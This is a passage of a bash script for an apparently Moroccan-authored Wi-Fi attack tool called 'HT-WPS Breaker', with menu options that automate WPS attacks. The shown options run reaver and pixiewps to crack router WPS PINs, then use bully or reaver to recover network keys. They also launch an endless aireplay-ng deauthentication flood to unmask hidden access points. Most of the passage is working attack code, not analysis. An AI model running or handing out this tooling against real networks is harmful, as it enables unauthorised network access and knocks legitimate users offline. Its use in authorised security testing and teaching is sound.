                           Ver_Mon_Fun
						   clear
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CHANNEL
						   echo ""
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you capture$Green the required arguments$White,GooD LucK"
								   sleep 1
						   done
						   reaver -i $mon -b $BSSID -c $CHANNEL -vv
						   echo ""						   
					       echo -e -n "$Cyan [+]$Yellow PKE : $Green"
						   read PKE
						   echo -e -n "$Cyan [+]$Yellow PKR : $Green"
						   read PKR
						   echo -e -n "$Cyan [+]$Yellow E-Hash1 : $Green"
						   read E_Hash1
						   echo -e -n "$Cyan [+]$Yellow E-Hash2 : $Green"
						   read E_Hash2
						   echo -e -n "$Cyan [+]$Yellow AuthKey : $Green"
						   read AuthKey
						   echo -e -n "$Cyan [+]$Yellow E-Nonce : $Green"
						   read E_Nonce
                           echo -e -n "$Cyan [+]$Yellow R-Nonce : $Green"
						   read R_Nonce
						   if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]
									      then
                                              echo -e "$White [+]$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
											  pixiewps -v 3 -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/${BSSID}.txt | head -n 11 | tail -n 9
									          PIN=`less PIN/${BSSID}.txt | grep 'WPS pin:'`
											     if [ "$PIN" != "" ]
									                   then
													        echo""
                                                            echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                                                            read PIN
													        hash bully 2> /dev/null
						                                    hash_bully="$?"
						   						            if [ $hash_bully -eq 0 ]
														        then
															        echo ""
															        echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
															        echo ""
															        bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon
															        echo -e "$Yellow [+]$Green Congratulation (^_^) "
															        echo ""
														        else
															        echo ""
															        echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
															        echo ""
															        reaver -i $mon -b $BSSID -c $CHANNEL -vvv -n -L -P -p $PIN
															        echo -e "$Yellow [+]$Green Congratulation (^_^) "
															        echo ""
													        fi
									              else
									              	   cd PIN
												       cat ${Desktop_PATH}/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
									                   echo ""
										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
												       echo ""
													   rm -rf ${Desktop_PATH}/${BSSID}.txt
												       cd ..
									               fi
						                 else
										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
											  echo ""
				            fi
				    fi
				    ;;			
			"4")
				  airmon-ng > ${Temporary}/.airmon-ng.txt
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                  Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
                       then
                           Ver_Mon_Fun
						   clear
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow ESSID : $White"
						   read ESSID
						   echo ""
                           echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                           read PIN
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CHANNEL
						   echo ""
						   hash bully
						   hash_bully="$?"
						   if [ $hash_bully -eq 0 ]
								then
									echo ""
									echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
									echo ""
									bully -b $BSSID -c $CHANNEL -B -F -e "$ESSID" -p $PIN $mon
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
								else
									echo ""
									echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
									echo ""
									reaver -i $mon -b $BSSID -c $CHANNEL -vv -e "$ESSID" -p $PIN
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
							fi
						   
				fi
				;;
			  "5")
                 Ver_Pckg_Tools
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you see your target,good luck"
								   sleep 1
						   done
						   Ver_Dir=`ls /tmp/HT-WPS-Breaker | grep -E '^capture$'`
						   if [ "$Ver_Dir" != "" ];then
	      			            rm -rf ${Temporary}/capture
								mkdir ${Temporary}/capture
						   else
						        mkdir ${Temporary}/capture
     					   fi
						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
						   back=0
						   trap exit_function SIGINT
						   clear
					       echo -e "$Red+---------------------------------------------------------------------------------------+"
						   echo -e "| [+]$White If the BSSID in$BGreen green$White that means there are clients connected to device.$Red           |"
						   echo -e "| [+]$White If the BSSID in$BYellow yellow$White that means there are clients connected to device or aren't.$Red|"
						   echo -e "+---------------------------------------------------------------------------------------+$White"
						   echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
						   echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
						   i=0
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
								   v=0
								   length=${#MAC}
		                           PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		                           PRIVACY=${PRIVACY:0:4}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
										Ver_vun=`echo $MAC | cut -c 1-8`
			                          	if [ "$CLIENT" != "" ]; then
				                             CLIENT="Yes"
										else
								             CLIENT="No"
			                            fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
										if [ "$CLIENT" == "Yes" ]
										    then
											    echo -e -n $BGreen"$MAC\t"
									        else
								    		    echo -e -n $BYellow"$MAC\t"
										fi
										echo -e -n $BWhite"$CHANNEL\t"
										echo -e -n $BWhite"$PRIVACY\t"
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$CLIENT" == "Yes" ]
										     then
										         echo -e -n $Green"$CLIENT\t"
										     else
											     echo -e -n $Red"$CLIENT\t"
										fi
										echo -e $BWhite"$ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            PRIVACY[$i]=$PRIVACY
			                            SPEED[$i]=$SPEED
		                            fi
								 done < ${Temporary}/capture/capture-02.csv
						   echo ""
						   if [ "$i" -eq "0" ]
						   	   then
						   	       exit_function
						   fi
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -n -e "${White}  [+]${Blue} Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
						                      read  N_OB
											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
											      then
											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
											  	        then
											                V_number=1
											         else
											                V_number=0
											         fi
											  else
											         V_number=0
											  fi
						   done
						   echo ""
						   trap - SIGINT SIGQUIT SIGTSTP
						   idlenght=${IDLENGTH[$N_OB]}
						   CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
						   BSSID=${BSSID[$N_OB]}
						   rm -rf ${Temporary}/capture/*
						   echo ""
						   echo -e "${White}  +${Yellow}------------------------------${White}+"
						   echo -e "${Yellow}  |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
						   echo -e "${White}  +${Yellow}------------------------------${White}+"
						   echo ""
						   trap kill_Hidden SIGINT
						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -c $CHANNEL -a $mon 2> /dev/null &
						   Airodump_PID=$!
						   disown $Airodump_PID
						   tset
						   aireplay-ng -0 0 -a $BSSID $mon > /dev/null 2> /dev/null &
						   aireplayID=$!
						   disown $aireplayID
						   Quit=0
						   while [ $Quit == 0 ]
								do
								  Hidden=`cat ${Temporary}/capture/capture-01.csv 2> /dev/null | grep ${BSSID} | cut -d',' -f14`
								  Ver_Name=`echo -e $Hidden`
								  if [ "$Ver_Name" != "" ]
								     then
								    	 echo ""
										 echo -en "\033[1A\033[2K"
                           		         echo -ne "${Yellow}          >>${White} The name has been obtained${Green} successfully ${White}."
                           		         Quit=1
                           		  else
                           		         echo -ne "\r${Yellow}          >>${White} The name of${Green} AP${White} is still {${Red} Hidden${White} } ."
                           		         Quit=0
                           		  fi
						   done
						   trap exit_function SIGINT
						   kill -9 $aireplayID 2> /dev/null
						   kill -9 $Airodump_PID 2> /dev/null
						   sleep 2.0
						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
						   SELECT_CAPTURE_CRACK
				fi
                  ;;
              "6")
                  for (( i = 0; i <= 9; i++ ))
                     do
                       sleep 0.2
                       echo -en "\033[1A\033[2K"
                  done
                  echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Enable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                  |"
                  sleep 0.2
                  echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Red Disable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                 |"
                  sleep 0.2
                  echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Back to menu ${White}.${White}                                             |"
                  sleep 0.2
                  echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
                  echo ""
                  echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
                  read ID
                  ID=`expr $ID + 0 2> /dev/null`
                  case $ID in
                               "1")
                                   airmon-ng > ${Temporary}/.airmon-ng.txt
                                   VerMon=""
                                   VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                                   Ver_Mon_WCar_Fun
                                   mode_monitor=no
                                   ;;
							   "2")
							       airmon-ng > ${Temporary}/.airmon-ng.txt
						           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						           if [ $cou_mon -ge 1 ]
						                then
								            Ver_aircrack_ng=`aircrack-ng | grep -w "1.2 rc2"`
						                    Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
								            echo -e "[+] We found$Green $cou_mon$White monitor mode."
									        echo ""
						                    echo -e $Yellow" +${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
						                    echo -e " ${White}| ${Yellow}ID${White} |   ${BRed}Interface     ${Yellow}|$Cyan     Chipset        ${White}|"
						                    echo -e " ${Yellow}+${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
						                    for (( c=1; c<=$Num_Mon; c++))
       						                    do
										            m[$c]=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | sed -n ${c}'p'`
										            if [ "$Ver_aircrack_ng" != "" ]
                           	                           then
                           	                               Interface=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f2`
                           	                               Chipset=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | rev | cut -f1 | rev`
                           	                               if [ "$cou_mon" -lt "10" ]
                           	             	                  then
                           	                                      echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                               else
                           	             	                      echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                               fi
                           	                        else
                           	                	           airmon-zc > ${Temporary}/.airmon-zc.txt
	     						                           Interface=`cat ${Temporary}/.airmon-zc.txt | grep ${m[$c]} | cut -f2`
                           	                               Chipset=`cat ${Temporary}/.airmon-zc.txt | grep ${m[$c]} | rev | cut -f1 | rev`
                           	                               if [ "$cou_mon" -lt "10" ]
                           	             	                  then
                           	                                      echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                               else
                           	             	                   echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                               fi
	     						                    fi
						                    done
									        echo ""
									        echo ""
											V_number=0
									        while [ "$V_number" != "1" ]
									                do
											          echo -en "\033[1A\033[2K"
						                              echo -e -n "\r${White}[+] select$Red number$White of interface in order to${Red} Disable${White} it from [${Green}1-$Num_Mon$White]:$Green"
						                              read number
											          if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									                     then
											                 if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
											                     V_number=1
														         mon=${m[$number]}
											                 else
											                     V_number=0
											                 fi
											          else
											                     V_number=0
											          fi
								            done
											echo ""
											trap kill_load SIGINT
											airmon-ng stop $mon > /dev/null &
						                    PID="$!"
						                    Wait_Msg="Disabling${Cyan} Monitor Mode${White} on$Green $mon $White."
						                    End_Msg="${Cyan}Monitor Mode${White}$White is${Red} Disable ."
						                    Loading
						                    trap - SIGINT SIGQUIT SIGTSTP
											sleep 1
								   else
								            echo "" 
                            	            sleep 0.5
                            	            echo -e $White" [${Red}!${White}] Is no${Cyan} Monitor Mode${White} to${Red} Disable${White} ."
                            	            echo ""
                            	            sleep 0.5
						           fi
							       ;;
								"3")
								    re="yes"
								    ;;
								"*")
								    echo ""
			                        echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
			                        echo ""
								    ;;
                  esac
                  ;;
			  "7")
                  echo ""
                  echo -e "$White[${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
                  echo ""
			      exit
			      ;;
			  *)
			   echo ""
			   echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
			   echo ""
			   ;;
esac
echo ""
echo -e "$White     [${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
echo ""
   while [ "$re" != 'Y' ] && [ "$re" != 'y' ] && [ "$re" != 'Yes' ] && [ "$re" != 'YES' ] && [ "$re" != 'yes' ] && [ "$re" != 'N' ] && [ "$re" != 'n' ] && [ "$re" != 'No' ] && [ "$re" != 'NO' ] && [ "$re" != 'no' ] && [ "$re" != 'O' ] && [ "$re" != 'o' ] && [ "$re" != 'Oui' ] && [ "$re" != 'OUI' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
         do
           echo -n -e "$Red\r                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
           read re
		   echo -en "\033[1A\033[2K"
   done
done

trap "" SIGINT

echo -e "$White [${Red}!${White}] Remove any temporary file."
rm -rf ${Temporary}
sleep 1
echo ""
if [ "$mode_monitor" == "active" ]
    then
        echo -e "$White [${Red}!${White}]$Red Stop$White the ${Green}Monitor Mode$White."
        airmon-ng stop $mon > /dev/null
        echo ""
fi
echo -e "$White [+]$Green Greetz to ${White}: ${Cyan}AKAS ."
echo ""
echo -e "             ${Green}########################################################"
sleep 0.1
echo -e "             ##                ${Yellow}{Full Information}${Green}                  ##"
sleep 0.1
echo -e "             ##   ${Cyan}-Author   ${White}:      {${Yellow} Silent Ghost ${White}}                ${Green}##"
sleep 0.1
echo -e "             ##   ${Cyan}-Country  ${White}:      {${Red} Morocco ${White}}                     ${Green}##"
sleep 0.1
echo -e "             ##   ${Cyan}-Email    ${White}:      {${Purple} silent-ghostx@outlook.com ${White}}   ${Green}##"
sleep 0.1
echo -e "             ########################################################"
sleep 0.1
echo ""